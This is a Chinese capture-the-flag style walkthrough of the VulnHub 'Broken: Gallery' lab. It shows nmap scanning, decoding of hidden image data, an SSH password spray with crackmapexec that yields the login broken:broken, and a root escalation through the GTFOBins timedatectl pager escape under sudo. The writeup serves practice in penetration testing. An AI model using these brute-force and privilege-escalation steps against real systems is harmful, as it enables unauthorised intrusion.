# BROKEN:GALLERY主机渗透实现

- 靶机地址:https://www.vulnhub.com/entry/broken-gallery,344/
- 下载地址:https://download.vulnhub.com/broken/Broken.7z

## 信息收集:

### 主机发现:

- 当前IP段:`192.168.2.0/24`,当前主机IP:`192.168.2.2`

- ```shell
  └─$ sudo nmap -sn --min-rate 10000 192.168.2.1/24                                          
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 01:41 EDT
  Nmap scan report for 192.168.2.1
  Host is up (0.0021s latency).
  MAC Address: 00:50:56:C0:00:01 (VMware)
  Nmap scan report for 192.168.2.14
  Host is up (0.00023s latency).
  MAC Address: 00:0C:29:54:AE:2D (VMware)
  Nmap scan report for 192.168.2.254
  Host is up (0.00010s latency).
  MAC Address: 00:50:56:E4:FB:DB (VMware)
  Nmap scan report for 192.168.2.2
  Host is up.
  Nmap done: 256 IP addresses (4 hosts up) scanned in 13.33 seconds
  ```

- 靶机IP:`192.168.2.14`

### 端口扫描:

- TCP端口扫描

- ```shell
  └─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.14 -oA Nmap-scan/sT
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 01:42 EDT
  Nmap scan report for 192.168.2.14
  Host is up (0.00080s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 00:0C:29:54:AE:2D (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 12.25 seconds
  ```

- UDP端口扫描

- ```shell
  └─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.14 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 01:42 EDT
  Warning: 192.168.2.14 giving up on port because retransmission cap hit (10).
  Nmap scan report for 192.168.2.14
  Host is up (0.00056s latency).
  All 65535 scanned ports on 192.168.2.14 are in ignored states.
  Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
  MAC Address: 00:0C:29:54:AE:2D (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 79.46 seconds
  
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/Broken_Gallery]
  └─$ sudo nmap -sU --min-rate 10000 --top-port 20 192.168.2.14 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 01:44 EDT
  Nmap scan report for 192.168.2.14
  Host is up (0.00023s latency).
  
  PORT      STATE         SERVICE
  53/udp    closed        domain
  67/udp    open|filtered dhcps
  68/udp    open|filtered dhcpc
  69/udp    closed        tftp
  123/udp   open|filtered ntp
  135/udp   open|filtered msrpc
  137/udp   open|filtered netbios-ns
  138/udp   closed        netbios-dgm
  139/udp   closed        netbios-ssn
  161/udp   open|filtered snmp
  162/udp   open|filtered snmptrap
  445/udp   open|filtered microsoft-ds
  500/udp   open|filtered isakmp
  514/udp   open|filtered syslog
  520/udp   open|filtered route
  631/udp   open|filtered ipp
  1434/udp  open|filtered ms-sql-m
  1900/udp  open|filtered upnp
  4500/udp  open|filtered nat-t-ike
  49152/udp open|filtered unknown
  MAC Address: 00:0C:29:54:AE:2D (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds
  ```

### 服务及操作系统扫描:

- ```shell
  └─$ sudo nmap -sC -sV -O -p22,80 192.168.2.14 -oA Nmap-scan/sC        
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 01:43 EDT
  Nmap scan report for 192.168.2.14
  Host is up (0.00063s latency).
  
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 39:5e:bf:8a:49:a3:13:fa:0d:34:b8:db:26:57:79:a7 (RSA)
  |   256 20:d7:72:be:30:6a:27:14:e1:e6:c2:16:7a:40:c8:52 (ECDSA)
  |_  256 84:a0:9a:59:61:2a:b7:1e:dd:6e:da:3b:91:f9:a0:c6 (ED25519)
  80/tcp open  http    Apache httpd 2.4.18
  | http-ls: Volume /
  | SIZE  TIME              FILENAME
  | 55K   2019-08-09 01:20  README.md
  | 1.1K  2019-08-09 01:21  gallery.html
  | 259K  2019-08-09 01:11  img_5terre.jpg
  | 114K  2019-08-09 01:11  img_forest.jpg
  | 663K  2019-08-09 01:11  img_lights.jpg
  | 8.4K  2019-08-09 01:11  img_mountains.jpg
  |_
  |_http-title: Index of /
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  MAC Address: 00:0C:29:54:AE:2D (VMware)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Aggressive OS guesses: Linux 3.2 - 4.9 (98%), Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 - 3.16 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Android 5.0 - 6.0.1 (Linux 3.4) (94%), Linux 3.2 - 3.10 (94%), Linux 3.2 - 3.16 (94%), Linux 4.5 (93%)
  No exact OS matches for host (test conditions non-ideal).
  Network Distance: 1 hop
  Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 21.45 seconds
  ```

### 默认漏洞扫描;

- ```shell
  └─$ sudo nmap --script=vuln -p22,80 192.168.2.14 -oA Nmap-scan/Script
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 02:05 EDT
  Nmap scan report for 192.168.2.14
  Host is up (0.00054s latency).
  
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  | http-slowloris-check: 
  |   VULNERABLE:
  |   Slowloris DOS attack
  |     State: LIKELY VULNERABLE
  |     IDs:  CVE:CVE-2007-6750
  |       Slowloris tries to keep many connections to the target web server open and hold
  |       them open as long as possible.  It accomplishes this by opening connections to
  |       the target web server and sending a partial request. By doing so, it starves
  |       the http server's resources causing Denial Of Service.
  |       
  |     Disclosure date: 2009-09-17
  |     References:
  |       http://ha.ckers.org/slowloris/
  |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
  | http-sql-injection: 
  |   Possible sqli for queries:
  |     http://192.168.2.14:80/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=N%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=M%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=D%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=S%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=N%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.14:80/?C=S%3BO%3DA%27%20OR%20sqlspider
  |_    http://192.168.2.14:80/?C=M%3BO%3DA%27%20OR%20sqlspider
  |_http-csrf: Couldn't find any CSRF vulnerabilities.
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  | http-enum: 
  |_  /: Root directory w/ listing on 'apache/2.4.18 (ubuntu)'
  MAC Address: 00:0C:29:54:AE:2D (VMware)
  ```

## web信息发现:

- 默认页面--> 将文件全部下载到本地进行查看
- ![image-20230823134935801](https://raw.githubusercontent.com/r0o983/images/main/202308231349883.png)
- 使用`exiftool`查看图片信息,使用`steghide`来查看图片隐写信息,使用`binwalk`查看图片是否具有捆绑信息
- 使用`steghide info` 查看四张图片,发现全部都带有隐藏文件,但是目前我们并没有获得密码,无法获得其中信息. 
- ```shell
  └─$ steghide info img_5terre.jpg 
  "img_5terre.jpg":
    format: jpeg
    capacity: 15.1 KB
  Try to get information about embedded data ? (y/n) y
  Enter passphrase: 
  steghide: could not extract any data with that passphrase!
  ```

### 解码`README`文件

- 当前`README.md`文件使用16进制格式进行编码,使用python将内容进行解码:(方式1:)

- 安装`Pillow`库-->`pip install Pillow`

- ```python
  from PIL import Image
  import io
  
  # 创建变量存储十六进制数据
  hex_data = [
      0xFF, 0xD8, 0xFF, 0xE0,
      # 请确保将所有的十六进制数据都添加到这里
  ]
  
  # 将十六进制数据转换为字节对象
  byte_data = bytes(hex_data)
  
  # 将字节数据包装在内存中的io对象中
  image_io = io.BytesIO(byte_data)
  
  # 打开图像
  image = Image.open(image_io)
  
  # 显示图像
  image.show()
  ```

- 使用`xxd -r -ps README.md > README.bin` 将当前16进制转化为2进制(方式2:)

- 使用`strings README.bin | head -n 20`使用`strings`查看前20行,主要是查看文件类型.当前文件为`.jpeg`

- 直接修改文件后缀为`README.jpeg` 打开文件.....

- 解码后的图像为:

- ![image-20230823145449288](https://raw.githubusercontent.com/r0o983/images/main/202308231454376.png)

- 查看当前图片的捆绑信息

- ```shell
  └─$ binwalk tmp1e1xnnqy.PNG 
  
  DECIMAL       HEXADECIMAL     DESCRIPTION
  --------------------------------------------------------------------------------
  0             0x0             PNG image, 413 x 270, 8-bit/color RGB, non-interlaced
  99            0x63            Zlib compressed data, default compression
  ```

- 使用python解包,或者可以使用`zlib-flate -uncompress <文件名> 解压后名称`例如:

- `zlib-flate -uncompress <compressed_data.zlib>  hideen_message`

- 使用python进行解包

- ```python
  import zlib
  
  with open("compressed_data.zlib", "rb") as f:
      compressed_data = f.read()
  
  decompressed_data = zlib.decompress(compressed_data)
  
  with open("hidden_data", "wb") as f:
      f.write(decompressed_data)
  ```

- 使用binkwalk再次查看捆绑信息

- ```shell
  └─$ binwalk hidden_data 
  
  DECIMAL       HEXADECIMAL     DESCRIPTION
  --------------------------------------------------------------------------------
  81610         0x13ECA         MySQL ISAM compressed data file Version 6
  89978         0x15F7A         MySQL ISAM index file Version 5
  96160         0x177A0         MySQL ISAM compressed data file Version 6
  97430         0x17C96         MySQL ISAM index file Version 5
  130505        0x1FDC9         MySQL MISAM compressed data file Version 7
  139434        0x220AA         MySQL ISAM index file Version 5
  139515        0x220FB         MySQL MISAM index file Version 3
  140953        0x22699         MySQL MISAM compressed data file Version 7
  196030        0x2FDBE         MySQL ISAM compressed data file Version 6
  279209        0x442A9         MySQL MISAM compressed data file Version 7
  281728        0x44C80         MySQL ISAM index file Version 5
  283266        0x45282         LZMA compressed data, properties: 0x5B, dictionary size: 50331648 bytes, uncompressed size: 771 bytes
  296782        0x4874E         MySQL MISAM compressed data file Version 7
  ```

- 卡住了... 怀疑是作者故意的...

## ssh爆破

- 收集已知的所有用户名以及密码信息,进行ssh爆破尝试

- ```shell
  └─$ cat crash                                        
  gallery
  5terre
  forest
  lights
  mountains
  terre
  Bob
  bob
  cheers
  avrahamcohen.ac
  avrahamcohen
  tem1e1xnnqy
  BROKEN
  broken
  ```

- 这里推荐使用`crackmapexec`,在使用`hydra`进行破解由于速度过快,会导致当前靶机频繁重置ssh连接

- ```shell
  └─$ crackmapexec ssh 192.168.2.14 -u crash -p crash --continue-on-success | grep "+"
  SSH         192.168.2.14    22     192.168.2.14     [+] broken:broken
  ```
  
- ssh登录信息:`broken`:`broken`

#### 获得初始权限

- ```shell
  └─$ ssh broken@192.168.2.14
  broken@192.168.2.14's password: 
  Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)
  
   * Documentation:  https://help.ubuntu.com/
  
  762 packages can be updated.
  458 updates are security updates.
  
  Last login: Fri Aug  9 02:40:48 2019 from 10.11.1.221
  broken@ubuntu:~$ ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 00:0c:29:54:ae:2d brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.14/24 brd 192.168.2.255 scope global dynamic ens33
         valid_lft 1278sec preferred_lft 1278sec
      inet6 fe80::c3a7:5822:f3b9:ad34/64 scope link 
         valid_lft forever preferred_lft forever
  broken@ubuntu:~$ whoami
  broken
  broken@ubuntu:~$ uanme -a
  No command 'uanme' found, did you mean:
   Command 'uname' from package 'coreutils' (main)
  uanme: command not found
  broken@ubuntu:~$ lsb_release -a
  No LSB modules are available.
  Distributor ID: Ubuntu
  Description:    Ubuntu 16.04 LTS
  Release:        16.04
  Codename:       xenial
  ```

## 提权

- ```shell
  broken@ubuntu:~$ sudo -l
  Matching Defaults entries for broken on ubuntu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
  
  User broken may run the following commands on ubuntu:
      (ALL) NOPASSWD: /usr/bin/timedatectl
      (ALL) NOPASSWD: /sbin/reboot
  broken@ubuntu:~$ 
  ```

- 当前用户不需要密码即可使用`timedatectl`命令,[点我查看提权路径](https://gtfobins.github.io/gtfobins/timedatectl/#sudo)

  1. `sudo timedatectl list-timezones`
  2. `!/bin/sh`
  3. 即可完成权限提升

- ```shell
  broken@ubuntu:~$ sudo timedatectl list-timezones
  Africa/Abidjan
  Africa/Accra
  Africa/Addis_Ababa
  Africa/Algiers
  Africa/Asmara
  Africa/Bamako
  Africa/Bangui
  Africa/Banjul
  Africa/Bissau
  Africa/Blantyre
  Africa/Brazzaville
  Africa/Bujumbura
  Africa/Cairo
  Africa/Casablanca
  Africa/Ceuta
  Africa/Conakry
  Africa/Dakar
  Africa/Dar_es_Salaam
  Africa/Djibouti
  Africa/Douala
  Africa/El_Aaiun
  Africa/Freetown
  Africa/Gaborone
  Africa/Harare
  !/bin/sh
  # whoami
  root
  # python -c 'import pty;pty.spawn("/bin/bash")';
  root@ubuntu:~# whoami
  root
  root@ubuntu:~# ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 00:0c:29:54:ae:2d brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.14/24 brd 192.168.2.255 scope global dynamic ens33
         valid_lft 1647sec preferred_lft 1647sec
      inet6 fe80::c3a7:5822:f3b9:ad34/64 scope link 
         valid_lft forever preferred_lft forever
  root@ubuntu:~# uname -a
  Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
  root@ubuntu:~# 
  ```

